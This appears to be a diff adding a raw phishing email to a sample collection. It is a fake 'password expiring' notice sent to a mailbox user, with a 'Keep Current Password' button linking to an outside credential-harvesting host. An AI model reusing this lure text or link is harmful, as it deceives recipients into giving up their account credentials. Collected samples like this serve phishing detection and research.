@@ -1,0 +1,189 @@
+Return-Path: admin@techspoon.co
+Delivered-To: jose@monkey.org
+X-FDA: 83974166766.33.4B3B3F7
+Received: from mail.techspoon.co (mail.techspoon.co [80.96.156.40])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id ED3DE60004
+	for <jose@monkey.org>; Wed,  8 Oct 2025 07:47:46 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=pass header.d=techspoon.co header.s=dkim header.b=Jh9Xun7W;
+	spf=pass (imf20.b.hostedemail.com: domain of admin@techspoon.co designates
+ 80.96.156.40 as permitted sender) smtp.mailfrom=admin@techspoon.co;
+	dmarc=pass (policy=quarantine) header.from=techspoon.co
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1759909667;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=s0pm8oeGhVKTLYm19yCmyAPzD92uLVjnwUCPFy/BswQ=;
+	b=00wUcnLZbyGqhb7uXc69lDzNnaByOdfCWWxJTVygydDjSW51DeCy1mxJT+RrgPOcDdAQNC
+	8gunBXlQVd6eNA0rJRWbHQwxQTG19AGpudx36aYEaj893u0R2M6NtMzf59yVxbuHZ8yWkM
+	B/Hmv2xLL0RzaF3MkyIlPM/vW8TXTgM=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1759909667; a=rsa-sha256;
+	cv=none;
+	b=HCNpLukT6lr28xTi49SCWYkOW2qI08zUBhPLgNnVJSb+bnatjGXiFglz+Ppxxt+Tye1zA9
+	4MLs8a90GO18kaL5ikBKDKL5HZM3+kx+Ldrc+bh2S0XgTYLBBUu4M8dZxtnhkrU5Ub4Mmz
+	UE33lxaUQMQnQsIsmrgDrXczkj5ytEI=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=pass header.d=techspoon.co header.s=dkim header.b=Jh9Xun7W;
+	spf=pass (imf20.b.hostedemail.com: domain of admin@techspoon.co designates
+ 80.96.156.40 as permitted sender) smtp.mailfrom=admin@techspoon.co;
+	dmarc=pass (policy=quarantine) header.from=techspoon.co
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=techspoon.co;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=admin@techspoon.co;
+ bh=s0pm8oeGhVKTLYm19yCmyAPzD92uLVjnwUCPFy/BswQ=;
+ b=Jh9Xun7W6SGutDq2h0YT9IwKYOBU5uUcAftizcAbf4rWkklw6ZZ4hdafp/IDLtRkRnREUuM3RBC9
+   34G7FoJ5AyVeudLyL+CzcBY8KCIplAAcuaXkUUxX1RtHw/4XpPv5nit7xaDkeMpeiJLBTTpMYFvV
+   y9/vozGngdIp2uup1r/JXRjSQFe9d7LptulvN7jPNdHoEIQ0gpB8N4bgZwNCXUO0irubIkH0wqPs
+   LNCJ2MHYQtypFnSJW1u2OOM6zig1pe236ARBCLkJhNjj6SSvHDahPfbMOwh8Rh2Yq5IZkt5u1saR
+   V4aaFUnTyqhxBJkYeXUe32HsXbAAOEODL3WT2w==
+From: EMAIL ALERT <admin@techspoon.co>
+To: jose@monkey.org
+Subject: EMAIL jose@monkey.org VERSION UPGRADE
+Date: 8 Oct 2025 00:47:43 -0700
+Message-ID: <20251008004743.64A5E63B727EC2A6@techspoon.co>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: ED3DE60004
+X-Rspam-User: 
+X-Stat-Signature: xtsa8hdxrhdcey1tthxzibk4kkx4nrjy
+X-Spam-Status: No, score=6.20
+X-HE-Tag: 1759909666-532797
+X-HE-Meta: 
+ U2FsdGVkX19L15nHrPW5R4JPZUZ9QBtwt0041hKoaNmpXsnWrpnDqcXa9DvAIWPS5NQXSRTLaU/4UpEqnltv48Z93pUw9QslzHnJLghqFMNEss666D822G+5JGE+6fx3KMLnFJPa/lbwOrQuM7CNpcTOQ6b39y50vkm80wSldJwn3rBeytf0+BeXfGXM2SPm2KXFhtmjbPD4su40Uh6GlGLZa1M2DiaYSyIe1GY0vKOvOgK7JfId+sTWoIRwqQz+RlzwMZP3aCm+3v+rLRH1Cpl/HN10wICPpRx16uyG6UpecX62g3ZRY/FOkaNmIvVxC6kuVNFvVCO6E2doqgblOhLnDUfePEcOXbP91G9K2kPxHUwluUw4XlbxDpx3DhuZe+MAp3vJ/o7MKFX1hyz7Y8vuvOlo2oqwdJGiSPSAA7ql7g/JegzDmIar+o19/5hCam6eVmggPEpi4ZpUS6VXxp3UpGtv4cQvw/0yrHhtg+YPcrLsua4tiT/1R8QTxwS6V395HbNLnfWVD6n86qwD7pIqrVPLlMvSz5JoJNnINQyelrVNCaTMoVka2uYZGhB8twOjCDNz/UfKRLAhhvvyhHHUGlTJ3EgNISNBivnvoT18/fHNJxig77iQMhsvRWfNw6olnMLdmJmdEAmLFUENH3UFEmhFJtqfNuCscQ2c9ouasG3rZvP8HQxiR9FPMrIysAvFvleCrv1ZHhbe3uQS/RAy32/sh7r8DnmgXDccHWWOJtpLQfkBtpoQOalEo9UXWgdp0fR6iGhSwTEtgZMgHEBGA//CinDF7Tc+wNQcouNQ3+uaMqtmCxzZmfg3X+eMx/ahzwxpYJoZjH39QyDedaouBNQc6LgGdtCDe2V4Anr3/YaGe6w3cNzLdd5Q4/7j1qEfYJrSg69XV+0tC/j/MtgLYK6TqmMfC0yldvOjO7msJt5u0u88N2ZXw6Q15Gd5ujOmVofLwj/aG5nxjnNBHMCqR87
+ GMYvfSElUHd5pWfz2jHNBRPR/4+q7hvFrUjGNa09KyHEmjwvcR7hclFM4Nnl98V1AMnpFmQrMlHAZdYz2a3fz2CVRTcA8nARSYtBhgOYLY3fFSISHlS7EBZYuJCIkcKi6WhAa381PZl1OrlQ91ia9wlw1KlwxQIqQyH7mX46PDVLE18EmDzy2WfXEasEegRr9i4ZVKL9shWa8/d+ocYNIpCkAJYDmqifUzFPMycd8cAThIpSEGMWLDSjVXT8OUBJ4rHo2n1rlF1hJtvGZxiVQQXgNOXRpkDdHS2EyQ7xP6tKYFll6Ofeo7iQPM+plCiHjQSm5UD5JaROGLWDEZITArv3sBr7Nu847o9/ZbbkGFgiofW73RlHSkslJlUoXUcGBlP+2H7kf0LI65g8owxlLS4WmzMydThlHTICkDAhDwvTtj7W88D9K75eYOIC4Mp7PiKoPledqExkR5/xbXZ7OGyZACoAOId2MPfaY0jZeNzLDgVviv91VkF8G+df9KQqQ+pjB
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 395
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<p>
+
+<table width=3D"100%" align=3D"center" class=3D"v1row v1row-1" style=3D"bor=
+der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
+=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<table width=3D"480" align=3D"center" class=3D"v1row-content" style=3D"widt=
+h: 480px; color: rgb(0, 0, 0); border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td width=3D"100%" class=3D"v1column" style=3D"border-width: 0px; text-alig=
+n: left; padding-top: 5px; padding-bottom: 5px; font-weight: 400; vertical-=
+align: top; box-sizing: border-box;">
+<table width=3D"100%" class=3D"v1text_block" style=3D"border-collapse: coll=
+apse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"font-family: sans-serif; box-sizing: border-box;">
+<div style=3D"color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma=
+, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;">
+<p style=3D"margin: 0px; text-align: center; font-size: 14px; box-sizing: b=
+order-box;"><span style=3D"font-size: 18px; box-sizing: border-box;">Your m=
+ailbox "<strong style=3D"font-weight: bolder; box-sizing: border-box;">jose=
+@monkey.org</strong>" password is expiring!</span></p></div></div></td></tr=
+></tbody></table>
+<table width=3D"100%" class=3D"v1divider_block" style=3D"border-collapse: c=
+ollapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpaddin=
+g=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td class=3D"v1divider_inner" style=3D"line-height: 1px; font-size: 1px; bo=
+rder-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style=
+: solid; box-sizing: border-box;"><span style=3D"box-sizing: border-box;">&=
+#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1text_block" style=3D"border-collapse: coll=
+apse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"5">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"font-family: Tahoma, Verdana, sans-serif; box-sizing: border-=
+box;">
+<div style=3D"color: rgb(57, 61, 71); line-height: 1.5; font-family: Tahoma=
+, Verdana, Segoe, sans-serif; font-size: 12px; box-sizing: border-box;">
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;">&nbsp;</=
+p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><span st=
+yle=3D"font-size: 14px; box-sizing: border-box;">The password to your mailb=
+ox&nbsp;jose@monkey.org&nbsp; has expired.</span></p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><br styl=
+e=3D"box-sizing: border-box;"><span style=3D"font-size: 14px; box-sizing: b=
+order-box;">A new password will be generated by the system.<br style=3D"box=
+-sizing: border-box;"></span><br style=3D"box-sizing: border-box;"><span st=
+yle=3D"font-size: 14px; box-sizing: border-box;">You will be signed out aut=
+omatically exactly 3 hours after this email is opened.<br style=3D"box-sizi=
+ng: border-box;"><br style=3D"box-sizing: border-box;"></span></p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><span st=
+yle=3D"font-size: 14px; box-sizing: border-box;">It is recommended to keep =
+using your current password.<br style=3D"box-sizing: border-box;"><br style=
+=3D"box-sizing: border-box;">To keep using your current password, kindly us=
+e the button below.</span></p>
+<p style=3D"margin: 0px; font-size: 14px; box-sizing: border-box;"><br styl=
+e=3D"box-sizing: border-box;"></p></div></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1button_block" style=3D"border-collapse: co=
+llapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;">
+<a style=3D"border-radius: 4px; border: 1px solid rgb(138, 59, 143); border=
+-image: none; width: auto; text-align: center; color: rgb(255, 255, 255); p=
+adding-top: 5px; padding-bottom: 5px; font-family: Tahoma, Verdana, Segoe, =
+sans-serif; text-decoration: none; display: inline-block; box-sizing: borde=
+r-box; background-color: rgb(0, 2, 165);"=20
+href=3D"https://ecn1609.cybernesticux.digital/?ca87620=3Djose@monkey.org" t=
+arget=3D"_blank" rel=3D"noreferrer">
+<span style=3D"letter-spacing: normal; padding-right: 20px; padding-left: 2=
+0px; font-size: 16px; display: inline-block; box-sizing: border-box;">
+<span style=3D"line-height: 1.5; font-size: 16px; box-sizing: border-box;">=
+Keep Current Password</span></span></a></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1divider_block" style=3D"border-collapse: c=
+ollapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpaddin=
+g=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div align=3D"center" style=3D"box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td class=3D"v1divider_inner" style=3D"line-height: 1px; font-size: 1px; bo=
+rder-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style=
+: solid; box-sizing: border-box;"><span style=3D"box-sizing: border-box;">&=
+#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
+<table width=3D"100%" class=3D"v1text_block" style=3D"border-collapse: coll=
+apse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"10">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<td style=3D"box-sizing: border-box;">
+<div style=3D"font-family: sans-serif; box-sizing: border-box;">
+<div style=3D"color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma=
+, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;">
+<p style=3D"margin: 0px; text-align: center; box-sizing: border-box;">Email=
+ is generated by&nbsp;monkey.org Email Server for jose@monkey.org</p></div>=
+</div></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody=
+></table><p></p></body></html>
+
